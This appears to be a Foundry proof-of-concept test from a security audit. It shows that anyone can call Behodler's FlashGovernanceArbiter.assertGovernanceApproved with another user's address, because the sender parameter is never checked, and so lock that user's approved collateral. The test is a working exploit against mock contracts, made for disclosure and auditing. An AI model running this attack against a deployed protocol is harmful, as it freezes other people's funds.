// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;

import "forge-std/Test.sol";
import "../src/behodler/contracts/DAO/FlashGovernanceArbiter.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockDAO {
    address public flashGoverner;
    constructor() { flashGoverner = address(0); }
    function getFlashGoverner() external view returns (address) { return flashGoverner; }
    function successfulProposal(address) external pure returns (bool) { return false; }
    function proposalConfig() external pure returns (address, address, address) { return (address(0), address(0), address(0)); }
}

contract MockAsset is ERC20 {
    constructor() ERC20("EYE", "EYE") {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract PoC_42453 is Test {
    FlashGovernanceArbiter arbiter;
    MockAsset asset;
    MockDAO dao;
    address alice = address(0xA11CE);
    address bob = address(0xB0B);
    address target = address(0xCAFE);

    function setUp() public {
        dao = new MockDAO();
        arbiter = new FlashGovernanceArbiter(address(dao));
        asset = new MockAsset();
        // Configuration is intentionally callable during the protocol's setup
        // phase (configured == false), matching the deployed source.
        arbiter.configureFlashGovernance(address(asset), 100 ether, 1 days, false);
        asset.mint(alice, 100 ether);
        vm.prank(alice);
        asset.approve(address(arbiter), type(uint256).max);
    }

    function test_anyone_can_lock_an_approving_users_collateral() public {
        vm.prank(bob);
        // The attacker supplies Alice as `sender`; the audited function never
        // authenticates that parameter against msg.sender.
        arbiter.assertGovernanceApproved(alice, target, true);

        assertEq(asset.balanceOf(alice), 0);
        assertEq(asset.balanceOf(address(arbiter)), 100 ether);
        (, uint256 amount, uint256 unlockTime, ) = arbiter.pendingFlashDecision(target, alice);
        assertEq(amount, 100 ether);
        assertGt(unlockTime, block.timestamp);

        vm.prank(alice);
        vm.expectRevert("Limbo: Flashgovernance decision pending.");
        arbiter.withdrawGovernanceAsset(target, address(asset));
    }
}
